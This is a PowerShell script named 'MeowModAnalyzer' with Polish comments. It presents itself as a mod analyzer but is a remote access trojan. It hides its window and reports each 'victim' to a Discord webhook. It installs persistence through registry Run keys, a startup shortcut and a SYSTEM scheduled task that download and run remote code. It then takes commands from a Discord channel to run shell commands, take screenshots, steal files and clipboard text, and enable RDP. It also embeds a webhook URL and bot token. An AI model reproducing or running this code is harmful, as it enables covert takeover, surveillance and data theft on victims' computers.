# MeowModAnalyzer v2.2.1
$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$botToken = "MTUxMjkxNzg2NTY0MzM3NjY2MA.GwQpKI.xsOr-EJt_6grJ9_HqOfUIsb0AgLUqP5QRhSoIk"
$channelId = "1512918078189731890"

# Schowaj okno konsoli
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    '
    [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
} catch {}

# Wysylanie wiadomosci na Discord webhook
function Send-Webhook {
    param(
        [string]$Content,
        [string]$FilePath,
        [string]$EmbedJson
    )
    
    $body = @{
        content = $Content
        username = "MeowModAnalyzer"
    }
    
    if ($EmbedJson) {
        $body["embeds"] = @($EmbedJson | ConvertFrom-Json)
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        try {
            Add-Type -AssemblyName System.Net.Http
            $client = New-Object System.Net.Http.HttpClient
            $form = New-Object System.Net.Http.MultipartFormDataContent
            
            $jsonString = $body | ConvertTo-Json -Depth 10 -Compress
            $jsonContent = New-Object System.Net.Http.StringContent $jsonString
            $form.Add($jsonContent, "payload_json")
            
            $fileStream = New-Object System.IO.FileStream ($FilePath, [System.IO.FileMode]::Open)
            $fileContent = New-Object System.Net.Http.StreamContent $fileStream
            $form.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePath))
            
            $client.PostAsync("$webhookUrl?wait=true", $form).Result | Out-Null
            $client.Dispose()
            $fileStream.Close()
            return
        } catch {}
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

# Wyslij informacje o nowym polaczeniu
function Send-NewConnectionInfo {
    $pcName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    
    try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
    try { $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $publicIp = "Unknown" }
    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
    try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
    
    try {
        $av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue).displayName -join ", "
    } catch { $av = "None" }
    if (-not $av) { $av = "None detected" }
    
    try {
        $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress -join ", "
    } catch { $localIp = "Unknown" }
    
    $embed = @{
        title = "New Victim Connected - $pcName"
        color = 3066993
        fields = @(
            @{ name = "PC Name"; value = $pcName; inline = $true }
            @{ name = "User"; value = $userName; inline = $true }
            @{ name = "OS"; value = $osInfo; inline = $false }
            @{ name = "Public IP"; value = $publicIp; inline = $true }
            @{ name = "Local IP"; value = $localIp; inline = $true }
            @{ name = "CPU"; value = $cpu; inline = $false }
            @{ name = "RAM"; value = $ram; inline = $true }
            @{ name = "Antivirus"; value = $av; inline = $true }
        )
        footer = @{ text = "MeowModAnalyzer v2.2.1" }
        timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
    }
    
    $embedJson = $embed | ConvertTo-Json
    Send-Webhook -Content "1" -EmbedJson $embedJson
}

# Zrob screenshot
function Take-Screenshot {
    param([string]$OutputPath)
    
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $graphics.Dispose()
        
        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        
        return $true
    } catch {
        return $false
    }
}

# Wykonaj komende
function Invoke-CommandAndSend {
    param([string]$CommandText)
    
    try {
        $result = Invoke-Expression -Command $CommandText 2>&1
        $output = $result | Out-String
        
        if ([string]::IsNullOrEmpty($output)) {
            $output = "[Command executed successfully - no output]"
        }
        
        if ($output.Length -gt 1900) {
            $tempFile = [System.IO.Path]::GetTempFileName() + ".txt"
            $output | Out-File -FilePath $tempFile -Encoding UTF8
            Send-Webhook -Content "Command output:" -FilePath $tempFile
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } else {
            Send-Webhook -Content $output
        }
    } catch {
        $errorMsg = $_.Exception.Message
        Send-Webhook -Content "Error: $errorMsg"
    }
}

# Wlacz persistence (uruchamianie przy starcie)
function Enable-Persistence {
    
    # Metoda 1: Registry HKCU Run
    try {
        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MeowModAnalyzer" -Value $regValue -ErrorAction SilentlyContinue
    } catch {}
    
    # Metoda 2: Registry HKLM Run (wymaga admina)
    try {
        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MeowModAnalyzer" -Value $regValue -ErrorAction SilentlyContinue
    } catch {}
    
    # Metoda 3: Startup Folder
    try {
        $startupFolder = [Environment]::GetFolderPath("Startup")
        $shortcutPath = Join-Path $startupFolder "MeowModAnalyzer.lnk"
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $shortcut.WindowStyle = 7
        $shortcut.Save()
    } catch {}
    
    # Metoda 4: Task Scheduler (uruchamia sie jako SYSTEM)
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
        Register-ScheduledTask -TaskName "MeowModAnalyzerTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Wlacz RDP
function Enable-RDP {
    try {
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
        Send-Webhook -Content "RDP enabled on port 3389"
    } catch {
        $errorMsg = $_.Exception.Message
        Send-Webhook -Content "RDP failed: $errorMsg"
    }
}

# Glowny handler komend
function Handle-Command {
    param(
        [string]$CommandName,
        [string]$CommandArgs
    )
    
    $cmd = $CommandName.ToLower().Trim()
    $args = $CommandArgs
    
    switch ($cmd) {
        "!help" {
            $helpText = @"
**MeowModAnalyzer - Komendy:**
!screenshot - Zrzut ekranu
!cmd <komenda> - Wykonaj PowerShell
!shell <komenda> - Wykonaj CMD
!download <url> - Pobierz plik
!upload <sciezka> - Wyslij plik na Discord
!persist - Wlacz persistence
!rdp - Wlacz RDP
!info - Info o systemie
!ipconfig - Konfiguracja sieci
!pslist - Lista procesow
!prockill <pid> - Zabij proces
!lock - Blokada ekranu
!msg <tekst> - Pokaz okno dialogowe
!clipboard - Czytaj schowek
!exit - Zamknij agenta
"@
            Send-Webhook -Content $helpText
        }
        
        "!screenshot" {
            $ssPath = "$env:TEMP\ss_$(Get-Random).png"
            if (Take-Screenshot -OutputPath $ssPath) {
                Send-Webhook -Content "Screenshot:" -FilePath $ssPath
                Remove-Item $ssPath -Force -ErrorAction SilentlyContinue
            } else {
                Send-Webhook -Content "Screenshot failed"
            }
        }
        
        "!cmd" {
            if ($args) {
                Invoke-CommandAndSend -CommandText $args
            } else {
                Send-Webhook -Content "Usage: !cmd <komenda>"
            }
        }
        
        "!shell" {
            if ($args) {
                Invoke-CommandAndSend -CommandText "cmd /c $args"
            } else {
                Send-Webhook -Content "Usage: !shell <komenda>"
            }
        }
        
        "!download" {
            if ($args) {
                $fileName = [System.IO.Path]::GetFileName($args)
                $destPath = "$env:TEMP\$fileName"
                try {
                    Invoke-WebRequest -Uri $args -OutFile $destPath -ErrorAction Stop
                    Send-Webhook -Content "Downloaded: $fileName to $destPath"
                } catch {
                    $errorMsg = $_.Exception.Message
                    Send-Webhook -Content "Download failed: $errorMsg"
                }
            } else {
                Send-Webhook -Content "Usage: !download <url>"
            }
        }
        
        "!upload" {
            if ($args -and (Test-Path $args)) {
                Send-Webhook -Content "File: $args" -FilePath $args
            } else {
                Send-Webhook -Content "Usage: !upload <sciezka>"
            }
        }
        
        "!persist" {
            Enable-Persistence
            Send-Webhook -Content "Persistence enabled (Registry + Startup + Task Scheduler)"
        }
        
        "!rdp" {
            Enable-RDP
        }
        
        "!info" {
            try { $pcName = $env:COMPUTERNAME } catch { $pcName = "Unknown" }
            try { $userName = $env:USERNAME } catch { $userName = "Unknown" }
            try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
            try { $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $publicIp = "Unknown" }
            try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
            try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
            
            $embed = @{
                title = "System Info - $pcName"
                color = 3447003
                fields = @(
                    @{ name = "PC Name"; value = $pcName; inline = $true }
                    @{ name = "User"; value = $userName; inline = $true }
                    @{ name = "OS"; value = $osInfo; inline = $false }
                    @{ name = "Public IP"; value = $publicIp; inline = $true }
                    @{ name = "CPU"; value = $cpu; inline = $false }
                    @{ name = "RAM"; value = $ram; inline = $true }
                )
                timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
            }
            
            $embedJson = $embed | ConvertTo-Json
            Send-Webhook -Content "System Info:" -EmbedJson $embedJson
        }
        
        "!exit" {
            Send-Webhook -Content "Agent shutting down..."
            exit
        }
        
        "!ipconfig" {
            Invoke-CommandAndSend -CommandText "ipconfig /all"
        }
        
        "!pslist" {
            Invoke-CommandAndSend -CommandText "Get-Process | Format-Table Id, ProcessName, CPU, PM -AutoSize | Out-String"
        }
        
        "!prockill" {
            if ($args -and $args -match '^\d+$') {
                try {
                    Stop-Process -Id $args -Force
                    Send-Webhook -Content "Killed process with PID: $args"
                } catch {
                    $errorMsg = $_.Exception.Message
                    Send-Webhook -Content "Failed to kill PID $args : $errorMsg"
                }
            } else {
                Send-Webhook -Content "Usage: !prockill <pid>"
            }
        }
        
        "!lock" {
            try {
                rundll32.exe user32.dll,LockWorkStation
            } catch {}
            Send-Webhook -Content "Workstation locked"
        }
        
        "!msg" {
            if ($args) {
                try {
                    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                    [System.Windows.Forms.MessageBox]::Show($args, "MeowModAnalyzer", "OK", "Information") | Out-Null
                    Send-Webhook -Content "Message shown: $args"
                } catch {
                    $errorMsg = $_.Exception.Message
                    Send-Webhook -Content "Failed to show message: $errorMsg"
                }
            } else {
                Send-Webhook -Content "Usage: !msg <tekst>"
            }
        }
        
        "!clipboard" {
            try {
                Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
                if ($clipboardText) {
                    Send-Webhook -Content "Clipboard: $clipboardText"
                } else {
                    Send-Webhook -Content "Clipboard is empty"
                }
            } catch {
                $errorMsg = $_.Exception.Message
                Send-Webhook -Content "Failed to read clipboard: $errorMsg"
            }
        }
        
        "!runas" {
            if ($args) {
                $parts = $args -split ' ', 3
                if ($parts.Count -eq 3) {
                    $user = $parts[0]
                    $password = $parts[1]
                    $command = $parts[2]
                    
                    try {
                        $securePass = ConvertTo-SecureString $password -AsPlainText -Force
                        $credential = New-Object System.Management.Automation.PSCredential ($user, $securePass)
                        $result = Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {
                            param($cmd)
                            Invoke-Expression $cmd 2>&1 | Out-String
                        } -ArgumentList $command -ErrorAction Stop
                        Send-Webhook -Content "RunAs ($user): $result"
                    } catch {
                        $errorMsg = $_.Exception.Message
                        Send-Webhook -Content "RunAs failed: $errorMsg"
                    }
                } else {
                    Send-Webhook -Content "Usage: !runas <user> <pass> <cmd>"
                }
            } else {
                Send-Webhook -Content "Usage: !runas <user> <pass> <cmd>"
            }
        }
        
        default {
            Send-Webhook -Content "Unknown command: $cmd. Use !help for commands"
        }
    }
}

# ============================================================
# PETLA GLOWNA
# ============================================================

# Wyslij informacje o nowym polaczeniu (wysyla "1" na Discord)
Send-NewConnectionInfo

# Wlacz persistence
Enable-Persistence

# Wyslij potwierdzenie
Send-Webhook -Content "Agent ready! Listening for commands..."

# Glowna petla - REST API polling
$lastMessageId = $null

while ($true) {
    try {
        $url = "https://discord.com/api/v9/channels/$channelId/messages?limit=5"
        $headers = @{
            "Authorization" = "Bot $botToken"
            "User-Agent" = "MeowModAnalyzer/2.2.1"
        }
        
        $messages = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction SilentlyContinue
        
        if ($messages -and $messages.Count -gt 0) {
            foreach ($msg in $messages) {
                $isNew = ($lastMessageId -eq $null) -or ($msg.id -gt $lastMessageId)
                $isNotBot = -not $msg.author.bot
                $isCommand = $msg.content -match '^!'
                
                if ($isNew -and $isNotBot -and $isCommand) {
                    $parts = $msg.content -split ' ', 2
                    $commandName = $parts[0]
                    $commandArgs = ""
                    if ($parts.Count -gt 1) {
                        $commandArgs = $parts[1]
                    }
                    
                    Handle-Command -CommandName $commandName -CommandArgs $commandArgs
                }
                
                if ($lastMessageId -eq $null -or $msg.id -gt $lastMessageId) {
                    $lastMessageId = $msg.id
                }
            }
        }
    } catch {
        # Nie wysylaj bledow co 3 sekundy
    }
    
    Start-Sleep -Seconds 3
}
